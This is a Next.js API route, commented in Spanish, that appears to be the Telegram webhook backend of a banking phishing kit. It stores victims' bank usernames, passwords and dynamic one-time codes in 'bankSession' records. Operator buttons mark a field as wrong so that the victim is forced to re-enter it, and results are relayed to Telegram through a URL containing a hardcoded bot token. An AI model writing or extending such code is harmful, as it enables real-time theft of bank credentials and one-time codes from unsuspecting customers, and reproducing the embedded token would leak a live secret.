import { NextRequest, NextResponse } from 'next/server';
import prisma from '@/lib/prisma';
import { sendToTelegram } from '@/lib/telegram';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    
    // Manejar callback queries (botones)
    if (body.callback_query) {
      const callbackData = body.callback_query.data;
      const chatId = body.callback_query.message.chat.id;
      
      // Parsear el callback_data: "incorrect_campo_sessionId"
      const [action, field, sessionId] = callbackData.split('_');
      
      if (action === 'incorrect' && sessionId) {
        // Buscar la sesión
        const session = await prisma.bankSession.findUnique({
          where: { sessionId }
        });
        
        if (!session) {
          return NextResponse.json({ error: 'Session not found' }, { status: 404 });
        }
        
        // Marcar el campo como incorrecto y limpiar su valor
        const updateData: any = {};
        
        if (field === 'usuario') {
          updateData.usuarioIncorrecto = true;
          updateData.usuario = null;
        } else if (field === 'clave') {
          updateData.claveIncorrecta = true;
          updateData.clave = null;
        } else if (field === 'dinamica') {
          updateData.dinamicaIncorrecta = true;
          updateData.claveDinamica = null;
        }
        
        // Actualizar en la base de datos
        const updatedSession = await prisma.bankSession.update({
          where: { sessionId },
          data: updateData
        });
        
        // Actualizar el mensaje de Telegram
        if (session.telegramMessageId) {
          await sendToTelegram(updatedSession, session.telegramMessageId);
        }
        
        // Responder al callback para quitar el loading del botón
        await fetch(`https://api.telegram.org/bot7955811683:AAGJuSUBDihBFZrRD282kM40kEyhr9Ajwos/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: body.callback_query.id,
            text: `✅ Marcado como incorrecto. El usuario deberá volver a ingresarlo.`
          })
        });
        
        return NextResponse.json({ success: true });
      }
    }
    
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error in Telegram webhook:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}

// GET para verificar que el endpoint funciona
export async function GET() {
  return NextResponse.json({ status: 'Telegram webhook is running' });
}
